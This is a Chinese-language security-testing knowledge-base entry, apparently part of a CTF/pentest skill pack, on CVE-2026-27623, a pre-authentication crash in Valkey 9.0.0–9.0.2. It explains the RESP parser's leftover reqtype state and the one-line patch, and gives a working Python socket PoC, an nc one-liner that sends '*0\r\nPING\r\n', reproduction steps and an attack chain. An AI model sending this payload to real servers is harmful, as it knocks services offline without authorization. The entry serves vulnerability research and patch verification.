# Valkey RESP 协议：预认证断言失败 DoS（CVE-2026-27623）

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/11-dos/01-valkey-resp-dos.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **能力域**：本文为技术能力说明，按项目 `scope.md` 直接套用。
> **什么时候用**：命中「Valkey / RESP / Redis / 预认证」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- Valkey
- RESP
- Redis
- 预认证
- pre-auth
- DoS
- CVE-2026-27623
- 断言失败
- assertion failure

## 前置

- 前置：目标可达；测试时段与限速已约定（打快了会把自己变成 DoS）。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。

## 步骤

本文正文按下列小节顺序推进，**每一步的完整命令与脚本在「技术正文」对应小节里**（这类文档以代码体 + 表格为主，按小节读比按 bullet 读快）：

1. 受影响版本 — Valkey 9.0.0 – 9.0.2。修复版本：>= 9.0.3。补丁提交：2c311dd7173ffc715a3d61266fdede6096a097de。
2. 根因：RESP 状态机 reqtype 残留 — processInputBuffer 同一轮 read 内可包含多段请求。第一段 0\r\n（空 multibulk）被 parseMultibulk 消费后，handleParseResults 调用 resetCli…
3. 触发载荷（极简）
4. 状态机变化
5. Patch diff
6. 调用链
7. nc 触发后的典型输出
8. 本仓库 PoC
9. 修复后行为 — 9.0.3+ 上进程不崩；对 0 一节的处理完成后，对 PING 返回 +PONG。

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **nc 触发后的典型输出** — `=== VALKEY BUG REPORT START ===`
- **nc 触发后的典型输出** — `<pid>:M <date> # === ASSERTION FAILED CLIENT CONTEXT ===`
- **nc 触发后的典型输出** — `<pid>:M <date> # ==> networking.c:3528 'c->querybuf[c->qb_pos] == '*' is not true`

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

## 1. 受影响版本

Valkey 9.0.0 – 9.0.2。修复版本：>= 9.0.3。补丁提交：`2c311dd7173ffc715a3d61266fdede6096a097de`。

## 2. 根因：RESP 状态机 reqtype 残留

`processInputBuffer` 同一轮 `read` 内可包含多段请求。第一段 `*0\r\n`（空 multibulk）被 `parseMultibulk` 消费后，`handleParseResults` 调用 `resetClient()` 清理 argv，但**旧版未将 `c->reqtype` 清零**。循环继续处理剩余数据 `PING\r\n` 时，仍按 multibulk 路径解析，断言 `querybuf[qb_pos] == '*'` 失败 → 进程 abort。

### 触发载荷（极简）

```python
import socket

payload = b"*0\r\nPING\r\n"  # 两段 pipeline：空 multibulk + inline
with socket.create_connection(("target", 6379)) as s:
    s.sendall(payload)
    try:
        print(s.recv(4096))
    except ConnectionResetError:
        print("server aborted")
```

### 状态机变化

| 步骤 | querybuf 剩余 | reqtype | 解析路径 | 结果 |
|------|--------------|---------|---------|------|
| 初始 | `*0\r\nPING\r\n` | 0 | 见 `*` → `PROTO_REQ_MULTIBULK` | 正常进入 multibulk |
| 第一次 parseMultibulk | `PING\r\n` | `MULTIBULK` | 消费 `*0\r\n`，`qb_pos` → `P` | 返回 `READ_FLAGS_PARSING_NEGATIVE_MBULK_LEN` |
| handleParseResults | `PING\r\n` | `MULTIBULK` | `resetClient`，旧版不清 `reqtype` | `reqtype` 仍为 MULTIBULK |
| 第二次 parseInputBuffer | `PING\r\n` | `MULTIBULK` | 跳过类型检测，仍走 multibulk | **`qb_pos` 处是 `P`，断言失败** |

### Patch diff

```c
// handleParseResults 中的 NEGATIVE_MBULK_LEN 分支
resetClient(c);
c->reqtype = 0;  // ← 新增：清零 reqtype
return PARSE_OK;
```

## 3. 调用链

```
攻击者建立 TCP 连接到 Valkey 6379
    ↓ send *0\r\nPING\r\n（同一 TCP buffer 内 pipeline）
第一次 parseMultibulk 消费 *0\r\n，qb_pos 指向 'P'
    ↓ handleParseResults 调用 resetClient，reqtype 未清零
第二次 parseInputBuffer 跳过协议类型检测
    ↓ 仍按 multibulk 路径解析
parseMultibulk 断言 c->querybuf[c->qb_pos] == '*'
    ↓ qb_pos 处是 'P'，断言失败
serverAssertWithInfo(c, NULL, ...)
    ↓ valkey-server 进程 abort / 退出
```

## 4. 复现

```bash
# 编译受影响版本
git fetch --tags && git checkout 9.0.2
make distclean && make -j$(nproc)

# 启动服务（非常用端口）
./src/valkey-server --port 16379 --protected-mode no

# 发送攻击载荷
printf '*0\r\nPING\r\n' | nc -w 2 127.0.0.1 16379
```

### nc 触发后的典型输出

```text
=== VALKEY BUG REPORT START ===
<pid>:M <date> # === ASSERTION FAILED CLIENT CONTEXT ===
<pid>:M <date> # ==> networking.c:3528 'c->querybuf[c->qb_pos] == '*' is not true
```

### 本仓库 PoC

```bash
cd "CVE-2026-27623 Pre-Authentication DOS from malformed RESP request"
python3 exploit/exp.py
# 默认连接 127.0.0.1:16379
```

## 5. 修复后行为

9.0.3+ 上进程不崩；对 `*0` 一节的处理完成后，对 `PING` 返回 `+PONG`。

## 攻击链

```
1. 探测 Valkey/Redis 兼容端口可达 + 确认版本落在受影响区间
2. 建立预认证 TCP 连接（无需密码、无需命令权限）
3. 在同一 TCP buffer 中发送 *0\r\nPING\r\n pipeline 载荷
4. 第一次解析 *0 后 resetClient 未清理 reqtype
5. 第二次解析仍进入 multibulk 路径，qb_pos 指向 'P' 而非 '*'
6. networking.c 断言失败 → valkey-server abort → 预认证 DoS
7. 修复后重复发送载荷，应保持进程存活并对 PING 返回 +PONG
```

## Evidence

记录: 服务端崩溃日志、`networking.c:3528` 断言输出、nc 连接断开状态

## 参考资料

| 来源 | 链接 |
|------|------|
| GitHub Advisory | https://github.com/valkey-io/valkey/security/advisories/GHSA-93p9-5vc7-8wgr |
| 上游修复 | https://github.com/valkey-io/valkey/commit/2c311dd7173ffc715a3d61266fdede6096a097de |
| poc-lab 源 | https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-27623%20Pre-Authentication%20DOS%20from%20malformed%20RESP%20request |
